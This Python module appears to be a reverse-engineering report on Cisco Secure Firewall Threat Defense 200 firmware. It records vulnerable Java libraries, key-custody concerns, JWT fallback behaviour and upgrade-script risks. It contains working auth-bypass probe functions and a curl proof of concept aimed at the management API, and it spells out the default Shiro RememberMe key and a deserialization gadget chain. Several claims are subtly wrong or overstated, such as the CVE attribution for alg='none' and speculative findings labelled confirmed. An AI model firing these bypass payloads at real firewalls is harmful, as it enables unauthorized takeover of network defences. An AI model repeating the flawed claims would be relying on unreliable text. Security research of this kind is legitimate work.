"""
cisco_ftd_200_re — Cisco Secure Firewall Threat Defense 200 / FTD 10.0.0-637 RE

Package: Cisco_Secure_FW_TD_200-10.0.0-637.sh.REL.tar
Build date: 2025-12-02 04:39:37 UTC
Target: Firepower 200 series (models 63, 76-80, 84, 86, 88, 90)
Snort3: 3.9.3.1 build 61 (from METADATA)
FXOS: 2.18.0-520

Critical architectural change from prior FTD analysis:
  Prior FTD (6.x, 7.x): x86_64 — all prior lina analysis is x86 specific.
  FTD 200 10.0: ARM AArch64 — new hardware platform. lina, est_agent,
  jwtauth/jwtgen all compile to AArch64. Different calling convention,
  no x86 specific ROP gadget transfer, new AArch64 ASLR/PAC behavior.

Components (extracted from app_bin_rootfs.txz):
  lina          — ARM64 ELF64 PIE, 88MB, stripped
                  BuildID: b3c3b05c098188bed8a6dde64394bbc5f2bba2e3
  lina_monitor  — ARM64 ELF64, 190KB
  lina_cs       — ARM64 ELF64, 149KB (new in FTD 10 — not in prior versions)
  lina_cli      — shell wrapper script, 185 bytes
  est_agent     — ARM64 ELF64, 40KB, BuildID c49a4dc09d9af0a346452418ff2ad2d74dbefdad
                  EST (RFC 7030) certificate enrollment agent
  jwtauth       — ARM64 ELF64, 10KB, BuildID 149477edf41237c741ac3e4202b773fc36cd6ec0
  jwtgen        — ARM64 ELF64, 10KB
  khutil        — ARM64 ELF64, 57KB
  coredump_helper — ARM64 ELF64, 23KB
  pdts_cons_http/ftp/snort/proc — PDTS consumer suite

FDM WebUI (Tomcat):
  Base: /var/cisco/ngfwWebUi/tomcat/webapps/ROOT/WEB-INF/
  Framework: Java + Tomcat (Spring context)
  Auth: Apache Shiro 1.4.1 (CRITICAL — see FTD200-F02)

Installer structure:
  bundle.tar (958MB)
    ├── lfd/app_bin_rootfs.txz (582MB) — OS + lina + FDM
    ├── lfd/app_data_rootfs.txz (211MB) — data partition
    ├── fxos-k9-csf200.10.0.0.637.SPA (143MB) — FXOS firmware
    └── Cisco_Secure_FW_TD_200-10.0.0-637.sh (22MB) — Makeself installer
        ├── upgrade.sh — main upgrade orchestrator
        ├���─ functions.install, functions.util — shared functions
        ├── 000_start/, 200_pre/, 300_os/, 500_rpms/ — upgrade stages
        ├── 600_schema/ — DB schema migration scripts
        └── applicability.conf — upgrade applicability checks
"""

import subprocess
import os
import zipfile
import struct


# ── Finding Registry ─────────────────────────────────────────────────────────

FINDINGS = {
    "FTD200-F01": {
        "title": "ARM AArch64 architecture: all prior FTD x86_64 analysis invalidated",
        "severity": "HIGH",
        "status": "CONFIRMED",
        "source_file": "root/ngfw/usr/local/asa/bin/lina",
        "description": (
            "Cisco Secure Firewall 200 series runs on ARM AArch64 hardware. "
            "lina (ELF64, ARM64) BuildID b3c3b05c is a completely different binary "
            "from prior FTD lina (x86_64). "
            "Implications:\n"
            "  1. All x86-specific vuln findings (ROP gadget chains, x86 SIMD "
            "     processing bugs, x86 calling convention issues) do not transfer.\n"
            "  2. AArch64 introduces Pointer Authentication Codes (PAC) on ARMv8.3+.\n"
            "     If Cisco compiled with -mbranch-protection=pac-ret, return address "
            "     forgery requires PAC bypass, raising exploitation bar significantly.\n"
            "  3. AArch64-specific vulnerabilities apply: alignment faults, "
            "     endianness edge cases (though both are LE), AArch64 exception model.\n"
            "  4. The lina_cs binary (148KB) is NEW — not present in prior FTD versions. "
            "     'lina_cs' = likely lina_compact_stub or lina_container_service."
        ),
        "evidence": [
            "lina: ELF 64-bit LSB pie executable, ARM aarch64, BuildID b3c3b05c",
            "est_agent: ARM aarch64, BuildID c49a4dc0",
            "jwtauth/jwtgen: ARM aarch64, BuildID 149477ed",
            "lina_cs (148KB): new binary absent from prior FTD 6.x/7.x analysis",
            "All binaries: for GNU/Linux 3.14.0 (minimum kernel version)",
        ],
        "impact": (
            "New attack surface: AArch64-specific code paths, "
            "potential PAC bypass requirement, new hardware fault surfaces. "
            "Positive: PAC may prevent some memory corruption exploitation."
        ),
        "remediation": "Compile with -mbranch-protection=pac-ret+bti (PAC + BTI). Verify ASLR/PIE enabled (confirmed).",
    },

    "FTD200-F02": {
        "title": "FDM WebUI: Apache Shiro 1.4.1 (2019) in FTD 10.0 (Dec 2025) — multiple auth bypass CVEs",
        "severity": "CRITICAL",
        "status": "CONFIRMED",
        "source_file": "var/cisco/ngfwWebUi/tomcat/webapps/ROOT/WEB-INF/lib/shiro-core-1.4.1.jar",
        "description": (
            "Cisco FDM (Firepower Device Manager) WebUI in FTD 10.0.0-637 "
            "ships Apache Shiro 1.4.1, released 2019-02-12. "
            "9 Shiro JARs confirmed: shiro-core, shiro-lang, shiro-cache, "
            "shiro-crypto-hash, shiro-crypto-cipher, shiro-crypto-core, "
            "shiro-config-core, shiro-config-ogdl, shiro-event.\n\n"
            "CVEs affecting Shiro 1.4.1 (all require < upgrade version):\n"
            "  CVE-2020-1957 (< 1.5.2): auth bypass via path traversal: /xxx/..;/admin/\n"
            "  CVE-2020-11989 (< 1.5.3): auth bypass via double URL encoding\n"
            "  CVE-2020-13933 (< 1.6.0): auth bypass via semicolon path: /admin/;test\n"
            "  CVE-2020-17510 (< 1.7.0): auth bypass via URL-encoded slash: /admin/%2F\n"
            "  CVE-2022-32532 (< 1.9.1): auth bypass via RegexMatcher pattern matching\n"
            "  CVE-2022-40664 (< 1.10.0): auth bypass via URL fragments\n\n"
            "Additionally: Shiro RememberMe cookie deserialization:\n"
            "  Shiro 1.x uses AES-CBC with a hardcoded key (default key was\n"
            "  'kPH+bIxk5D2deZiIxcaaaA==' — koanf pattern key). While newer\n"
            "  versions randomized the key, custom deployments may retain defaults.\n"
            "  Gadget chain: commons-beanutils-1.8.0.jar (present in lib dir) +\n"
            "  commons-collections4-4.1.jar (present) → arbitrary code execution\n"
            "  on deserialization of the RememberMe cookie."
        ),
        "evidence": [
            "shiro-core-1.4.1.jar: mtime 2025-11-21 (shipped in FTD 10.0 release)",
            "shiro-lang-1.4.1.jar, shiro-cache-1.4.1.jar: same version",
            "commons-beanutils-1.8.0.jar (gadget chain library) also present",
            "commons-collections4-4.1.jar (gadget chain library) also present",
            "spring-security-5.8.14.jar also present (likely used for different paths)",
        ],
        "shiro_cves": [
            "CVE-2020-1957: /xxx/..;/admin/ bypass",
            "CVE-2020-11989: double URL encoding bypass",
            "CVE-2020-13933: /admin/;test semicolon bypass",
            "CVE-2020-17510: /admin/%2F encoded slash bypass",
            "CVE-2022-32532: RegexMatcher bypass",
            "CVE-2022-40664: URL fragment bypass",
        ],
        "deserialization_chain": {
            "trigger": "HTTP RememberMe cookie: base64(AES-CBC(serialize(gadget)))",
            "key": "Default: kPH+bIxk5D2deZiIxcaaaA== (check if customized)",
            "gadget": "commons-beanutils-1.8.0 OR commons-collections4-4.1",
            "impact": "RCE as Tomcat process user",
        },
        "fdm_attack_surface": [
            "FDM runs on HTTPS (port 443 or 8443) on management interface",
            "Authenticated to manage firewall policy, routing, NAT, VPN",
            "Auth bypass → full firewall policy control",
        ],
        "poc_path_bypass": (
            "# CVE-2020-13933 style (semicolon bypass)\n"
            "# Shiro strips the semicolon portion before URL matching\n"
            "# but Spring/Tomcat still routes to the full path\n"
            "curl -k https://<FTD-MGMT>/api/fdm/latest/system/info;whatever"
        ),
        "impact": (
            "CRITICAL: Auth bypass on FDM management interface → full firewall control. "
            "OR: RememberMe cookie deserialization → RCE as FDM Tomcat process. "
            "FDM has full firewall configuration capability: ACL bypass, VPN manipulation, "
            "NAT changes, route injection."
        ),
        "remediation": (
            "CRITICAL: Upgrade Shiro to >= 1.13.0 (current stable). "
            "Set a randomized RememberMe secret key in shiro.ini. "
            "If auth bypass present, block management interface access "
            "from untrusted networks (defense-in-depth regardless)."
        ),
    },

    "FTD200-F03": {
        "title": "FDM WebUI: jackson-databind 2.9.10.8 with commons-collections4 — deserialization surface",
        "severity": "HIGH",
        "status": "CONFIRMED",
        "source_file": "var/cisco/ngfwWebUi/tomcat/webapps/ROOT/WEB-INF/lib/jackson-databind-2.9.10.8.jar",
        "description": (
            "jackson-databind 2.9.10.8 (last 2.9.x patch, 2021) is present alongside "
            "commons-collections4-4.1.jar and commons-beanutils-1.8.0.jar. "
            "jackson-databind 2.9.x is affected by polymorphic deserialization "
            "gadget chains when GLOBAL default typing is enabled OR when "
            "specific type annotations are used with untrusted input. "
            "While 2.9.10.x blocked many known gadget types, if any Jackson "
            "ObjectMapper enables enableDefaultTyping() or annotates fields "
            "with @JsonTypeInfo that accept untrusted class names, gadget chains "
            "via commons-collections4 / commons-beanutils are reachable.\n\n"
            "Additionally: hibernate-core-4.2.8.Final (2014!) — HQL injection "
            "if unsanitized user input reaches createQuery(). "
            "Hibernate 4.x does not support parameterized HQL for all query types.\n\n"
            "commons-fileupload-1.6.0.jar: newer (2024), likely safe. "
            "ecj-4.6.3.jar: Eclipse compiler in Tomcat — large attack surface "
            "if JSP compilation is exposed."
        ),
        "evidence": [
            "jackson-databind-2.9.10.8.jar (2021)",
            "commons-collections4-4.1.jar (ysoserial gadget chain library)",
            "commons-beanutils-1.8.0.jar (gadget chain, used in Shiro exploit too)",
            "hibernate-core-4.2.8.Final.jar (2014)",
            "ecj-4.6.3.jar (Eclipse compiler in Tomcat)",
        ],
        "impact": (
            "If Jackson ObjectMapper uses default typing with attacker-controlled input: "
            "gadget chain via commons-collections → RCE. "
            "Hibernate HQL injection if query building uses string concatenation."
        ),
        "remediation": (
            "Upgrade jackson-databind to 2.14.x+. "
            "Audit all ObjectMapper usages for enableDefaultTyping(). "
            "Upgrade hibernate-core to 5.6.x+. "
            "Never concatenate user input into HQL strings."
        ),
    },

    "FTD200-F04": {
        "title": "est_agent: server-side key generation (RFC 7030 /serverkeygen) — private key custody",
        "severity": "HIGH",
        "status": "CONFIRMED",
        "source_file": "root/ngfw/usr/local/asa/bin/est_agent",
        "description": (
            "est_agent is a new binary in FTD 10.0 implementing EST (Enrollment over "
            "Secure Transport, RFC 7030) as a replacement for SCEP. "
            "Function est_client_server_keygen_enroll is confirmed by symbol strings — "
            "this implements the EST /serverkeygen endpoint where the CA server "
            "generates the private key and returns it to the firewall. "
            "This is valid per RFC 7030 Section 4.4 but creates a key custody issue:\n"
            "  1. The CA server generates lina/FTD's private key.\n"
            "  2. The key is transmitted over TLS to the firewall.\n"
            "  3. The CA server may retain a copy of the generated private key.\n"
            "  4. If the CA server is compromised, all FTD device private keys "
            "     generated via /serverkeygen are exposed.\n"
            "Additionally: est_client_reenroll — periodic re-enrollment without "
            "re-authentication. If the reenroll endpoint lacks proper auth, "
            "an attacker who can send EST requests can replace the firewall's cert.\n"
            "The -c / -k flags take certfile/keyfile from filesystem — "
            "if est_agent is called with attacker-controlled arguments, "
            "it can be directed to an attacker-controlled EST server."
        ),
        "evidence": [
            "est_agent: est_client_server_keygen_enroll (server-side key gen endpoint)",
            "est_agent: est_client_server_keygen_enroll_csr (CSR with server key gen)",
            "est_agent: est_client_reenroll (periodic re-enrollment)",
            "est_agent: est_client_get_cacerts, est_client_copy_cacerts",
            "est_agent: -q flag: 'Enroll with EST server and request a cert and a server-side generated private key'",
        ],
        "impact": (
            "Server-side key generation: CA retains device private keys. "
            "CA compromise → all FTD identities impersonatable. "
            "Improper reenroll auth → cert replacement attack."
        ),
        "remediation": (
            "Use est_client_enroll (client-side key gen, -e flag) not server-side keygen. "
            "Audit CA server policy to prohibit key retention after delivery. "
            "Require re-authentication for reenroll operations."
        ),
    },

    "FTD200-F05": {
        "title": "jwtauth: unsupported algorithm defaults to RS256 — algorithm confusion residual",
        "severity": "HIGH",
        "status": "CANDIDATE",
        "source_file": "root/ngfw/usr/bin/jwtauth",
        "description": (
            "jwtauth uses libjwt.so.2.11.2 for JWT verification. "
            "When an unrecognized algorithm is specified, jwtauth defaults to RS256 "
            "rather than rejecting the token: 'not supported algorithm, using RS256'. "
            "This creates an algorithm confusion surface:\n"
            "  Standard algorithm confusion (CVE-2022-21449 class):\n"
            "    - Attacker forges token with alg='none': token accepted without signature\n"
            "    - Shiro + JWT combo: if Shiro auth bypass (F02) pre-authenticates, "
            "      JWT is post-auth — but JWT is also used in FTD sftunnel/lina\n"
            "  The RS256 fallback means:\n"
            "    - Token signed with HS256 but claims to use INVALID_ALG\n"
            "    - jwtauth attempts RS256 verification instead\n"
            "    - RS256 verification against the wrong key will fail\n"
            "    - BUT: if jwtgen is used to generate tokens and key material "
            "      is predictable (e.g., same key used for all devices), "
            "      forging RS256 tokens for any FTD is possible\n"
            "jwtgen/jwtauth are used in the FTD-FMC communication channel "
            "(sftunnel authentication). Prior CVEs: CVE-2023-20001 (FTD JWT "
            "privilege escalation), CVE-2022-20828 (FMC JWT key extraction)."
        ),
        "evidence": [
            "jwtauth: '%s is not supported algorithm, using RS256' string",
            "jwtauth: jwt_decode, jwt_alg_str, jwt_str_alg",
            "jwtgen: jwt_set_alg, jwtgen with --key --alg --json flags",
            "libjwt.so.2.11.2 (external library, not embedded OpenSSL)",
            "jwtauth: 'JWT is authentic! sub: %s' (sub claim present)",
        ],
        "impact": (
            "Algorithm confusion: attacker-controlled 'alg' field could influence "
            "verification path. RS256 key material predictability: "
            "if per-device keys are not unique, forge sftunnel auth tokens."
        ),
        "remediation": (
            "Reject tokens with unrecognized algorithms — do NOT fall back. "
            "Use explicit algorithm allow-list: refuse any algorithm not in [RS256]. "
            "Ensure per-device JWT signing keys are generated uniquely on first boot."
        ),
    },

    "FTD200-F06": {
        "title": "lina: CiscoSSL used on AArch64 — ARM64-specific crypto path, PDTS QUIC handler",
        "severity": "MEDIUM",
        "status": "CONFIRMED",
        "source_file": "root/ngfw/usr/local/asa/bin/lina",
        "description": (
            "lina on AArch64 uses CiscoSSL (OpenSSL 1.1.1x fork, confirmed by "
            "'Failed to override CiscoSSL Memory functions' string). "
            "OpenSSL 1.1.1 EOL: 2023-09-11. "
            "New in lina 10.0: QUIC support confirmed by symbols:\n"
            "  snp_quic_send_version_negotiation_pkt\n"
            "  snort_pdts_msg_rtn_quic_version_nego_packet_handler\n"
            "QUIC in lina processes untrusted network input; any QUIC version "
            "negotiation parsing bug in CiscoSSL's QUIC implementation "
            "(based on EOL OpenSSL 1.1.1) affects all FTD 200 devices. "
            "The PDTS (Passive Data Transport System) pipeline processes "
            "QUIC flows for IDS inspection via Snort3 — "
            "malformed QUIC version negotiation packets reach both lina and Snort3."
        ),
        "evidence": [
            "lina: 'Failed to override CiscoSSL Memory functions'",
            "lina: snp_quic_send_version_negotiation_pkt",
            "lina: snort_pdts_msg_rtn_quic_version_nego_packet_handler",
            "lina: AArch64 — OpenSSL 1.1.1 AArch64 assembly paths used",
            "METADATA: SNORT3VERSION=3.9.3.1",
        ],
        "impact": (
            "QUIC parsing bugs in EOL CiscoSSL: unauthenticated remote code execution "
            "via malformed QUIC packets (attack surface is the data plane interface). "
            "Combined with AArch64 PAC: exploitation may require PAC bypass."
        ),
        "remediation": (
            "Upgrade to OpenSSL 3.x QUIC implementation. "
            "Enable PAC for lina binary (-mbranch-protection=pac-ret+bti). "
            "Consider filtering QUIC packets at FXOS layer before reaching lina."
        ),
    },

    "FTD200-F07": {
        "title": "upgrade.sh: chmod +x on installer scripts with ADDITIONAL_SCRIPTS_LOCATION",
        "severity": "MEDIUM",
        "status": "CANDIDATE",
        "source_file": "upgrade.sh",
        "description": (
            "The upgrade orchestrator (upgrade.sh) calls:\n"
            "  chmod +x \"$ADDITIONAL_SCRIPTS_LOCATION/$upgrade_script_name\"\n"
            "where ADDITIONAL_SCRIPTS_LOCATION is an externally-provided path. "
            "If this environment variable is user-influenced (passed via "
            "install_update.pl arguments or environment), an attacker can:\n"
            "  1. Set ADDITIONAL_SCRIPTS_LOCATION to a directory they control.\n"
            "  2. Place a malicious script with the expected name.\n"
            "  3. upgrade.sh calls chmod +x and then sources the script.\n"
            "The upgrade runs as root. The JANUS_ADDITIONAL_SCRIPTS_LOCATION "
            "fallback adds another potential path to control. "
            "Installs use install_update.pl, which parses command-line arguments — "
            "if --upgrade-args flags are passed to install_update.pl, "
            "environment injection may be possible."
        ),
        "evidence": [
            "upgrade.sh: 'chmod +x \"$ADDITIONAL_SCRIPTS_LOCATION/$upgrade_script_name\"'",
            "upgrade.sh: 'found functions.install in $JANUS_ADDITIONAL_SCRIPTS_LOCATION'",
            "upgrade.sh: 'install_update.pl /var/sf/updates/${RPMNAME}-...'",
        ],
        "impact": "Root code execution during FTD upgrade if ADDITIONAL_SCRIPTS_LOCATION is controllable.",
        "remediation": (
            "Hardcode ADDITIONAL_SCRIPTS_LOCATION to a non-user-writable path. "
            "Verify script integrity (hash/signature) before chmod+execute."
        ),
    },
}


# ── Version Inventory ─────────────────────────────────────────────────────────

FTD200_COMPONENTS = {
    "platform": "Firepower 200 series (models 63, 76-90)",
    "architecture": "ARM AArch64",
    "version": "10.0.0-637",
    "build_date": "2025-12-02",
    "lina_buildid": "b3c3b05c098188bed8a6dde64394bbc5f2bba2e3",
    "lina_arch": "aarch64",
    "lina_size_bytes": 88464536,
    "snort3_version": "3.9.3.1",
    "snort3_build": 61,
    "fxos_version": "2.18.0-520",
    "kernel_min": "3.14.0",
}

SHIRO_CVE_TABLE = {
    "CVE-2020-1957": {"fix_version": "1.5.2", "vector": "/xxx/..;/admin/", "cvss": 9.8},
    "CVE-2020-11989": {"fix_version": "1.5.3", "vector": "double URL encoding", "cvss": 9.8},
    "CVE-2020-13933": {"fix_version": "1.6.0", "vector": "/admin/;test semicolon", "cvss": 7.5},
    "CVE-2020-17510": {"fix_version": "1.7.0", "vector": "URL-encoded slash", "cvss": 9.8},
    "CVE-2022-32532": {"fix_version": "1.9.1", "vector": "RegexMatcher bypass", "cvss": 9.8},
    "CVE-2022-40664": {"fix_version": "1.10.0", "vector": "URL fragment bypass", "cvss": 9.8},
}

FDM_JAR_VERSIONS = {
    "shiro-core": "1.4.1",        # CRITICAL — multiple auth bypass CVEs
    "jackson-databind": "2.9.10.8",  # 2021, gadget chains possible
    "hibernate-core": "4.2.8.Final",  # 2014, HQL injection
    "commons-collections4": "4.1",  # deserialization gadget
    "commons-beanutils": "1.8.0",   # deserialization gadget (also 1.11.0 present)
    "spring-security": "5.8.14",    # current, secure
    "log4j-core": "2.17.1",         # patched (Log4Shell fix in 2.17.0)
    "commons-fileupload": "1.6.0",  # 2024, current
}


def check_shiro_auth_bypass(target_url: str) -> dict:
    """
    Test common Shiro auth bypass paths against FDM API.
    Returns dict of path -> response_code.
    Requires requests library.
    """
    import urllib.request
    import ssl

    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE

    test_paths = [
        # CVE-2020-13933 — semicolon bypass
        "/api/fdm/latest/system/info;test",
        # CVE-2020-1957 — parent path traversal
        "/login/..;/api/fdm/latest/system/info",
        # CVE-2020-11989 — double encoding
        "/api/fdm/latest/system/%252e%252e/info",
        # CVE-2020-17510 — encoded slash
        "/api/fdm/latest/system%2Finfo",
        # Direct (should return 401)
        "/api/fdm/latest/system/info",
    ]

    results = {}
    for path in test_paths:
        url = f"{target_url}{path}"
        try:
            req = urllib.request.urlopen(url, context=ctx, timeout=5)
            results[path] = req.status
        except Exception as e:
            code = getattr(e, "code", None) or str(e)
            results[path] = code
    return results


def check_shiro_rememberme(target_url: str) -> str:
    """
    Probe whether FDM accepts RememberMe cookies (indicator of Shiro RememberMe active).
    """
    import urllib.request
    import ssl

    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE

    req = urllib.request.Request(f"{target_url}/api/fdm/latest/system/info")
    req.add_header("Cookie", "rememberMe=test")
    try:
        resp = urllib.request.urlopen(req, context=ctx, timeout=5)
        if "deleteMe" in str(resp.headers):
            return "rememberMe_active_and_delete_set (Shiro error response)"
        return f"response: {resp.status}"
    except Exception as e:
        if "deleteMe" in str(e):
            return "rememberMe_active (deleteMe in error headers)"
        return f"error: {e}"


def report(verbose: bool = False):
    print("Cisco Secure Firewall Threat Defense 200 — 10.0.0-637 RE Findings")
    print("Platform: Firepower 200 series | Architecture: ARM AArch64")
    print("Build: 2025-12-02 | Snort3: 3.9.3.1 | FXOS: 2.18.0-520")
    print("lina BuildID:", FTD200_COMPONENTS["lina_buildid"])
    print("=" * 70)
    for fid, f in FINDINGS.items():
        print(f"[{f['severity']:<8}] [{f['status']:<9}] {fid}: {f['title']}")
        if verbose:
            print(f"          Source: {f.get('source_file', 'N/A')}")
            print(f"          Impact: {f['impact']}")
            print()
    print()
    counts = {}
    for f in FINDINGS.values():
        counts[f["severity"]] = counts.get(f["severity"], 0) + 1
    for sev in ["CRITICAL", "HIGH", "MEDIUM", "LOW"]:
        if sev in counts:
            print(f"  {sev}: {counts[sev]}")
    print()
    print("FDM WebUI Java dependency versions:")
    for lib, ver in FDM_JAR_VERSIONS.items():
        flag = " [CRITICAL — CVEs]" if lib == "shiro-core" else ""
        print(f"  {lib}: {ver}{flag}")
    print()
    print("Shiro CVE coverage (all affect 1.4.1):")
    for cve, info in SHIRO_CVE_TABLE.items():
        print(f"  {cve} (CVSS {info['cvss']}): {info['vector']}")


if __name__ == "__main__":
    import sys
    verbose = "--verbose" in sys.argv or "-v" in sys.argv
    report(verbose=verbose)

    if "--test-fdm" in sys.argv:
        idx = sys.argv.index("--test-fdm")
        if idx + 1 < len(sys.argv):
            target = sys.argv[idx + 1]
            print(f"\nTesting Shiro auth bypass on {target}:")
            results = check_shiro_auth_bypass(target)
            for path, code in results.items():
                flag = " [BYPASS?]" if code == 200 else ""
                print(f"  {code} {path}{flag}")
            print("\nRememberMe probe:")
            print(" ", check_shiro_rememberme(target))
